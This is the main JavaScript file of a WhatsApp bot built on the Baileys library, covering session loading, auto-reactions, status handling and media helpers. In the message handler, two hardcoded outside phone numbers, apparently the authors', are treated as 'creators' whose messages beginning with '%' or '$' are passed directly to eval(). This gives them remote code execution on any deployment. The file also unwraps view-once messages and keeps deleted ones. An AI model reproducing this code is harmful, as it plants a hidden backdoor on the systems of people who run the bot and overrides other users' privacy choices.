const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents')
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX

const ownerNumber = ['255767862457']

// Add missing imports
const PhoneNumber = require('awesome-phonenumber')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./exif')
const { getSizeMedia } = require('./lib/functions')

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir, { recursive: true })
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) {
      console.error('Error reading temp directory:', err)
      return
    }
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) console.error('Error deleting temp file:', err)
      })
    }
  })
}

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000)

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/')) {
  fs.mkdirSync(__dirname + '/sessions/', { recursive: true })
}

if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  if(!config.SESSION_ID) {
    console.log('Please add your session to SESSION_ID env !!')
  } else {
    const sessdata = config.SESSION_ID.replace("NOVA~", '')
    const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
    filer.loadAttributes((err) => {
      if(err) {
        console.error('Error loading file attributes:', err)
        return
      }
      filer.download((err, data) => {
        if(err) {
          console.error('Error downloading session:', err)
          return
        }
        fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
          console.log("Session downloaded ✅")
        })
      })
    })
  }
}

const express = require("express")
const app = express()
const port = process.env.PORT || 9090

// Store initialization
const store = makeInMemoryStore({})
store.readFromFile('./baileys_store.json')
setInterval(() => {
  store.writeToFile('./baileys_store.json')
}, 10_000)

// Function to get the current date and time in Tanzania
function getCurrentDateTimeParts() {
    const options = {
        timeZone: 'Africa/Nairobi',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false,
    };
    const formatter = new Intl.DateTimeFormat('en-KE', options);
    const parts = formatter.formatToParts(new Date());

    let date = '', time = '';
    let day, month, year, hour, minute, second;

    parts.forEach(part => {
        switch(part.type) {
            case 'day':
                day = part.value;
                break;
            case 'month':
                month = part.value;
                break;
            case 'year':
                year = part.value;
                break;
            case 'hour':
                hour = part.value;
                break;
            case 'minute':
                minute = part.value;
                break;
            case 'second':
                second = part.value;
                break;
        }
    });

    date = `${day}/${month}/${year}`;
    time = `${hour}:${minute}:${second}`;

    return { date, time };
}

//=============================================

async function connectToWA() {
  try {
    console.log("[ ♻️ ] Connecting to WhatsApp ⏳️...")

    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
    const { version } = await fetchLatestBaileysVersion()

    const conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version
    })

    // Bind store to connection
    store.bind(conn.ev)

    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update

      if (qr) {
        console.log('[ 📱 ] QR Code generated. Please scan with WhatsApp.')
        qrcode.generate(qr, { small: true })
      }

      if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
        console.log('[ ⚠️ ] Connection closed:', lastDisconnect?.error?.output?.statusCode)
        
        if (shouldReconnect) {
          console.log('[ ♻️ ] Attempting to reconnect...')
          setTimeout(() => connectToWA(), 5000)
        } else {
          console.log('[ ❌ ] Logged out. Please update your SESSION_ID')
        }
      } else if (connection === 'open') {
        try {
          console.log('Connected to WhatsApp successfully ✅')

          // Auto Bio Update Interval
          if (config.AUTO_BIO === "true") {
            setInterval(async () => {
              const { date, time } = getCurrentDateTimeParts();
              const bioText = `🛡️ DML MD 🤖 LIVE NOW\n📅 ${date}\n⏰ ${time}`;
              try {
                await conn.setStatus(bioText);
                console.log(`Updated Bio: ${bioText}`);
              } catch (err) {
                console.error("Failed to update Bio:", err);
              }
            }, 60000); // Update every minute
          }

          fs.readdirSync("./plugins/").forEach((plugin) => {
            if (path.extname(plugin).toLowerCase() === ".js") {
              try {
                require("./plugins/" + plugin)
              } catch (e) {
                console.error(`Error loading plugin ${plugin}:`, e)
              }
            }
          })
          console.log('Plugins installed successful ✅')
          console.log('Bot connected to whatsapp ✅')
          const startMess = {
            image: { url: 'https://files.catbox.moe/4j07ae.jpg' },
            caption: `
───────────────────────────
*CONNECTED SUCCESSFUL ✅*
────────────────────────────
> Simple , Straight Forward But Loaded With Features, 
 Meet *NOVA-XMD* WhatsApp Bot🔥

*Thanks for using NOVA XMD* 
*Join WhatsApp Channel 🕊️*
> https://whatsapp.com/channel/0029VawO6hgF6sn7k3SuVU3z

*Join WhatsApp group 😎*
> https://chat.whatsapp.com/BKoqNbYGCkK5apBNP0nzI3

*ʏᴏᴜʀ ᴘʀᴇғɪx : ${config.PREFIX}*
────────────────────────────

> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝙽𝙾𝚅𝙰 ᴛᴇᴄʜ*`,
            contextInfo: {
              forwardingScore: 5,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '120363382023564830@newsletter', 
                newsletterName: "NOVA-XMD",
                serverMessageId: 143
              }
            }
          }

          await conn.sendMessage(conn.user.id, startMess)
        } catch (e) {
          console.error('Error during initialization:', e)
        }
      }
    })

    conn.ev.on('creds.update', saveCreds)

    //==============================
    conn.ev.on('messages.update', async updates => {
      for (const update of updates) {
        if (update.update.message === null) {
          console.log("Delete Detected:", JSON.stringify(update, null, 2))
          try {
            await AntiDelete(conn, update)
          } catch (e) {
            console.error('Error in anti-delete:', e)
          }
        }
      }
    })
    //============================== 

    conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update))
	  
    //=============readstatus=======
    conn.ev.on('messages.upsert', async(mek) => {
      if (!mek.messages || !mek.messages[0]) return
      
      const message = mek.messages[0]
      if (!message.message) return
      
      // Handle view once messages
      message.message = (getContentType(message.message) === 'ephemeralMessage') 
        ? message.message.ephemeralMessage.message 
        : message.message
      
      if (message.message.viewOnceMessageV2) {
        message.message = message.message.viewOnceMessageV2.message
      }
      
      if (config.READ_MESSAGE === 'true') {
        await conn.readMessages([message.key]).catch(e => console.error('Error reading message:', e))
        console.log(`Marked message from ${message.key.remoteJid} as read.`)
      }
      
      if (message.key && message.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
        await conn.readMessages([message.key]).catch(e => console.error('Error reading status:', e))
      }
      
      if (message.key && message.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
        const ravlike = conn.decodeJid(conn.user.id)
        const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👻', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '♻️', '🎉', '💜', '💙', '✨', '🖤', '💚']
        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]
        await conn.sendMessage(message.key.remoteJid, {
          react: {
            text: randomEmoji,
            key: message.key,
          } 
        }, { statusJidList: [message.key.participant, ravlike] }).catch(e => console.error('Error reacting to status:', e))
      }                       
      
      if (message.key && message.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
        const user = message.key.participant
        const text = `${config.AUTO_STATUS_MSG || 'Thanks for your status!'}`
        await conn.sendMessage(user, { text: text, react: { text: '💜', key: message.key } }, { quoted: message }).catch(e => console.error('Error replying to status:', e))
      }
      
      await Promise.all([
        saveMessage(message).catch(e => console.error('Error saving message:', e)),
      ])
      
      const m = sms(conn, message, store)
      const type = getContentType(message.message)
      const content = JSON.stringify(message.message)
      const from = message.key.remoteJid
      const quoted = type == 'extendedTextMessage' && message.message.extendedTextMessage && message.message.extendedTextMessage.contextInfo != null 
        ? message.message.extendedTextMessage.contextInfo.quotedMessage 
        : null
      const body = (type === 'conversation') 
        ? message.message.conversation 
        : (type === 'extendedTextMessage') 
          ? message.message.extendedTextMessage.text 
          : (type == 'imageMessage') && message.message.imageMessage && message.message.imageMessage.caption 
            ? message.message.imageMessage.caption 
            : (type == 'videoMessage') && message.message.videoMessage && message.message.videoMessage.caption 
              ? message.message.videoMessage.caption 
              : ''
      const isCmd = body && body.startsWith(prefix)
      const budy = typeof body == 'string' ? body : ''
      const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
      const args = body.trim().split(/ +/).slice(1)
      const q = args.join(' ')
      const text = args.join(' ')
      const isGroup = from.endsWith('@g.us')
      const sender = message.key.fromMe 
        ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) 
        : (message.key.participant || message.key.remoteJid)
      const senderNumber = sender.split('@')[0]
      const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
      const pushname = message.pushName || 'User'
      const isMe = botNumber.includes(senderNumber)
      const isOwner = ownerNumber.includes(senderNumber) || isMe
      const botNumber2 = await jidNormalizedUser(conn.user.id)
      const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {
        console.error('Error getting group metadata:', e)
        return {}
      }) : {}
      const groupName = isGroup ? groupMetadata.subject : ''
      const participants = isGroup ? await groupMetadata.participants : []
      const groupAdmins = isGroup ? await getGroupAdmins(participants) : []
      const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
      const isAdmins = isGroup ? groupAdmins.includes(sender) : false
      const isReact = message.message.reactionMessage ? true : false
      const reply = (teks) => {
        conn.sendMessage(from, { text: teks }, { quoted: message }).catch(e => console.error('Error replying:', e))
      }
      
      const udp = botNumber.split('@')[0]
      const rav = ['255767862457', '255741752020']
      let isCreator = [udp, ...rav, config.DEV]
        .filter(v => v)
        .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
        .includes(sender)

      // Eval commands for creator
      if (isCreator && budy.startsWith('%')) {
        let code = budy.slice(2)
        if (!code) {
          reply(`Provide me with a query to run Master!`)
          return
        }
        try {
          let resultTest = eval(code)
          if (typeof resultTest === 'object')
            reply(util.format(resultTest))
          else reply(util.format(resultTest))
        } catch (err) {
          reply(util.format(err))
        }
        return
      }
      
      if (isCreator && budy.startsWith('$')) {
        let code = budy.slice(2)
        if (!code) {
          reply(`Provide me with a query to run Master!`)
          return
        }
        try {
          let resultTest = await eval(
            'const a = async()=>{\n' + code + '\n}\na()',
          )
          let h = util.format(resultTest)
          if (h === undefined) return
          else reply(h)
        } catch (err) {
          if (err === undefined)
            return
          else reply(util.format(err))
        }
        return
      }
      
      // Owner react
      if (senderNumber.includes("255741752020") && !isReact) {
        const reactions = ["👑", "🥳", "📊", "⚙️", "🧠", "🎯", "✨", "🔑", "🏆", "👻", "🎉", "💗", "❤️", "😜", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌟", "🐥", "🧊"]
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
        m.react(randomReaction).catch(e => console.error('Error reacting:', e))
      }

      // Auto react for all messages
      if (!isReact && config.AUTO_REACT === 'true') {
        const reactions = [
          '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
          '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
          '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
          '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
          '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
          '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
          '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
          '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
          '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
          '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
          '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
          '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
          '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
          '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
          '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
        ]

        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
        m.react(randomReaction).catch(e => console.error('Error auto-reacting:', e))
      }
          
      // Custom react settings        
      if (!isReact && config.CUSTOM_REACT === 'true') {
        const reactions = (config.CUSTOM_REACT_EMOJIS || '🙂,😔').split(',')
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
        m.react(randomReaction).catch(e => console.error('Error custom reacting:', e))
      }
        
      // Mode checking
      if(!isOwner && config.MODE === "private") return
      if(!isOwner && isGroup && config.MODE === "inbox") return
      if(!isOwner && !isGroup && config.MODE === "groups") return
   
      // Handle commands
      try {
        const events = require('./command')
        const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false
        
        if (isCmd && cmdName) {
          const cmd = events.commands.find((cmd) => cmd.pattern === cmdName) || 
                     events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
          
          if (cmd) {
            if (cmd.react) {
              conn.sendMessage(from, { react: { text: cmd.react, key: message.key }}).catch(e => console.error('Error sending command react:', e))
            }

            try {
              await cmd.function(conn, message, m, {
                from, quoted, body, isCmd, command, args, q, text, isGroup, sender, 
                senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, 
                groupMetadata, groupName, participants, groupAdmins, isBotAdmins, 
                isAdmins, reply, l
              })
            } catch (e) {
              console.error("[PLUGIN ERROR] " + e)
            }
          }
        }
        
        // Handle on-event commands
        for (const command of events.commands) {
          if (body && command.on === "body") {
            try {
              await command.function(conn, message, m, {
                from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, 
                senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, 
                groupMetadata, groupName, participants, groupAdmins, isBotAdmins, 
                isAdmins, reply
              })
            } catch (e) {
              console.error('Error in body command:', e)
            }
          } else if (q && command.on === "text") {
            try {
              await command.function(conn, message, m, {
                from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, 
                senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, 
                groupMetadata, groupName, participants, groupAdmins, isBotAdmins, 
                isAdmins, reply
              })
            } catch (e) {
              console.error('Error in text command:', e)
            }
          } else if ((command.on === "image" || command.on === "photo") && type === "imageMessage") {
            try {
              await command.function(conn, message, m, {
                from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, 
                senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, 
                groupMetadata, groupName, participants, groupAdmins, isBotAdmins, 
                isAdmins, reply
              })
            } catch (e) {
              console.error('Error in image command:', e)
            }
          } else if (command.on === "sticker" && type === "stickerMessage") {
            try {
              await command.function(conn, message, m, {
                from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, 
                senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, 
                groupMetadata, groupName, participants, groupAdmins, isBotAdmins, 
                isAdmins, reply
              })
            } catch (e) {
              console.error('Error in sticker command:', e)
            }
          }
        }
      } catch (error) {
        console.error('Error loading commands:', error)
      }
    })
    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {}
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        )
      } else return jid
    }
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
        message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message 
          ? message.message.ephemeralMessage.message 
          : (message.message || undefined)
        vtype = Object.keys(message.message.viewOnceMessage.message)[0]
        delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
        delete message.message.viewOnceMessage.message[vtype].viewOnce
        message.message = {
          ...message.message.viewOnceMessage.message
        }
      }
    
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
        ...context,
        ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
        ...content[ctype],
        ...options,
        ...(options.contextInfo ? {
          contextInfo: {
            ...content[ctype].contextInfo,
            ...options.contextInfo
          }
        } : {})
      } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
      }
      let type = await FileType.fromBuffer(buffer)
      let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
      // save to file
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    //=================================================
    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
      }
    
      return buffer
    }
    
    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      let mime = ''
      let res = await axios.head(url).catch(e => {
        console.error('Error fetching URL:', e)
        return { headers: {} }
      })
      mime = res.headers['content-type'] || ''
      if (mime.split("/")[1] === "gif") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
      }
      let type = mime.split("/")[0] + "Message"
      if (mime === "application/pdf") {
        return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
      }
      if (mime.split("/")[0] === "image") {
        return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
      }
      if (mime.split("/")[0] === "video") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
      }
      if (mime.split("/")[0] === "audio") {
        return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
      }
    }
    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) {
        mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = {
        ...content,
        ...options
      }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id
    
      return proto.WebMessageInfo.fromObject(copy)
    }
    
    //=====================================================
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) 
        ? PATH 
        : /^data:.*?\/.*?;base64,/i.test(PATH) 
          ? Buffer.from(PATH.split(',')[1], 'base64') 
          : /^https?:\/\//.test(PATH) 
            ? await (res = await getBuffer(PATH)) 
            : fs.existsSync(PATH) 
              ? fs.readFileSync(PATH) 
              : typeof PATH === 'string' 
                ? PATH 
                : Buffer.alloc(0)
      
      let type = await FileType.fromBuffer(data) || {
        mime: 'application/octet-stream',
        ext: '.bin'
      }
      let filename = path.join(__dirname, new Date() * 1 + '.' + type.ext)
      if (data && save) {
        await fs.promises.writeFile(filename, data)
      }
      return {
        res,
        filename,
        size: await getSizeMedia(data),
        ...type,
        data
      }
    }
    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
        mimetype = mime,
        pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
        let { writeExif } = require('./exif.js')
        let media = { mimetype: mime, data }
        pathFile = await writeExif(media, { 
          packname: config.packname || 'NOVA', 
          author: config.author || 'NOVA-TECH', 
          categories: options.categories ? options.categories : [] 
        })
        await fs.promises.unlink(filename)
        type = 'sticker'
        mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
        [type]: { url: pathFile },
        mimetype,
        fileName: fileName || `file.${ext}`,
        ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || data.length <= 65536) {
        try { 
          throw { json: JSON.parse(data.toString()) } 
        } catch (e) { 
          if (e.json) throw e.json 
        }
      }
      let type = '',
        mimetype = mime,
        pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
        let { writeExif } = require('./exif')
        let media = { mimetype: mime, data }
        pathFile = await writeExif(media, { 
          packname: options.packname ? options.packname : config.packname || 'NOVA', 
          author: options.author ? options.author : config.author || 'NOVA-TECH', 
          categories: options.categories ? options.categories : [] 
        })
        await fs.promises.unlink(filename)
        type = 'sticker'
        mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
        [type]: { url: pathFile },
        caption,
        mimetype,
        fileName: fileName || `file.${ext}`,
        ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options)
      } else {
        buffer = await videoToWebp(buff)
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      )
    }
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options)
      } else {
        buffer = await imageToWebp(buff)
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      )
    }
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => {
      return conn.sendMessage(jid, { 
        text: text, 
        contextInfo: { 
          mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') 
        }, 
        ...options 
      }, { quoted })
    }
    
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) 
        ? path 
        : /^data:.*?\/.*?;base64,/i.test(path) 
          ? Buffer.from(path.split(',')[1], 'base64') 
          : /^https?:\/\//.test(path) 
            ? await getBuffer(path) 
            : fs.existsSync(path) 
              ? fs.readFileSync(path) 
              : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => {
      return conn.sendMessage(jid, { text: text, ...options }, { quoted })
    }
    
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
        text,
        footer,
        buttons,
        headerType: 2,
        ...options
      }
      return conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
        templateMessage: {
          hydratedTemplate: {
            imageMessage: message.imageMessage,
            "hydratedContentText": text,
            "hydratedFooterText": footer,
            "hydratedButtons": but
          }
        }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
      id = conn.decodeJid(jid)

      withoutContact = conn.withoutContact || withoutContact

      let v

      if (id.endsWith('@g.us'))
        return new Promise(async resolve => {
          v = store.contacts[id] || {}

          if (!(v.name || v.subject))
            v = await conn.groupMetadata(id).catch(() => ({}))

          resolve(
            v.name ||
              v.subject ||
              PhoneNumber(
                '+' + id.replace('@s.whatsapp.net', ''),
              ).getNumber('international'),
          )
        })
      else
        v =
          id === '0@s.whatsapp.net'
            ? {
                id,
                name: 'WhatsApp',
              }
            : id === conn.decodeJid(conn.user.id)
            ? conn.user
            : store.contacts[id] || {}

      return (
        (withoutContact ? '' : v.name) ||
        v.subject ||
        v.verifiedName ||
        PhoneNumber(
          '+' + jid.replace('@s.whatsapp.net', ''),
        ).getNumber('international')
      )
    }

    // Vcard Functionality
    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
      let list = []
      for (let i of kon) {
        list.push({
          displayName: await conn.getName(i + '@s.whatsapp.net'),
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
            i + '@s.whatsapp.net',
          )}\nFN:${config.OWNER_NAME || 'Owner'}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${config.EMAIL || ''}\nitem2.X-ABLabel:Email\nitem3.URL:${config.GITHUB || 'https://github.com'}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${config.LOCATION || 'Unknown'};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
        })
      }
      conn.sendMessage(
        jid,
        {
          contacts: {
            displayName: `${list.length} Contact`,
            contacts: list,
          },
          ...opts,
        },
        { quoted },
      )
    }
    // Status aka bio
    conn.setStatus = async(status) => {
      try {
        await conn.query({
          tag: 'iq',
          attrs: {
            to: '@s.whatsapp.net',
            type: 'set',
            xmlns: 'status',
          },
          content: [
            {
              tag: 'status',
              attrs: {},
              content: Buffer.from(status, 'utf-8'),
            },
          ],
        })
        return status
      } catch (e) {
        console.error('Error setting status:', e)
        throw e
      }
    }
    conn.serializeM = mek => sms(conn, mek, store)

    return conn
  } catch (error) {
    console.error('Error in connectToWA:', error)
    setTimeout(() => connectToWA(), 5000) // Retry after 5 seconds
  }
}
  
app.get("/", (req, res) => {
